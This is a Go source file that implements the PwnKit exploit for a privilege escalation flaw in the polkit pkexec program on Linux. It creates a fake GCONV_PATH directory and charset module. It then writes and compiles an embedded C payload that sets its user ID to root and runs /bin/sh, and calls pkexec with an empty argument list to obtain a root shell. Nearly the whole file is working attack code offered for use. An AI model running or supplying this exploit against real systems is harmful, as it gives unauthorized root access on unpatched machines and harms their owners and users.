package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
)

// This program is a PwnKit exploit written in Go
//
// Official CVE:
//    - https://marc.info/?l=oss-security&m=164313339424946&w=2
//
// References in C:
//    - https://github.com/ly4k/PwnKit/blob/main/PwnKit.c
//    - https://github.com/Fato07/Pwnkit-exploit/blob/main/exploit.c

// It's required to have gcc to compile the following C code.
// This ensures gconv

var cCode string = `
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
	setuid(0); setgid(0);
	seteuid(0); setegid(0);
	system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");
	exit(0);
}`

func main() {
	// make `GCONV_PATH=.` directory
	if _, err := os.Stat("GCONV_PATH=."); os.IsNotExist(err) {
		err := os.Mkdir("GCONV_PATH=.", 0777)
		if err != nil {
			panic(err)
		}
	}

	// Create pwnkit as a fake executable.
	// this takes advantave of the gconv charset being set to "pwnkit"
	if _, err := os.Stat("GCONV_PATH=./pwnkit"); os.IsNotExist(err) {
		f1, err := os.OpenFile("GCONV_PATH=./pwnkit", os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
		if err != nil {
			panic(err)
		}
		defer f1.Close()
	}

	// Make pwnkit directory with gconv modules
	if _, err := os.Stat("pwnkit"); os.IsNotExist(err) {
		err = os.Mkdir("pwnkit", 0777)
		if err != nil {
			panic(err)
		}
	}

	f2, err := os.Create("pwnkit/gconv-modules")
	if err != nil {
		panic(err)
	}
	defer f2.Close()

	// Inject fake charset for pwnkit
	_, err = fmt.Fprintln(f2, "module UTF-8// pwnkit// pwnkit 2")
	if err != nil {
		panic(err)
	}

	scafoldGconvPayload()
	compileGconvPayload()

	// This is the actual exploit:
	// Using nil here as the argv to pkexec, we can corrupt the memory and enter the root shell
	syscall.Exec("/usr/bin/pkexec", nil, []string{"pwnkit", "PATH=GCONV_PATH=.", "CHARSET=pwnkit", "SHELL=pwnkit"})

	cleanUp()
}

func scafoldGconvPayload() {
	f3, err := os.Create("pwnkit/pwnkit.c")
	if err != nil {
		panic(err)
	}
	defer f3.Close()

	_, err = fmt.Fprintln(f3, cCode)
	if err != nil {
		panic(err)
	}
}

func compileGconvPayload() {
	cmd := exec.Command("gcc", "pwnkit/pwnkit.c", "-o", "pwnkit/pwnkit.so", "-shared", "-fPIC")

	_, err := cmd.Output()
	if err != nil {
		panic(err)
	}
}

func cleanUp() {
	err := os.RemoveAll("GCONV_PATH")
	if err != nil {
		panic(err)
	}

	err = os.RemoveAll("pwnkit")
	if err != nil {
		panic(err)
	}
}
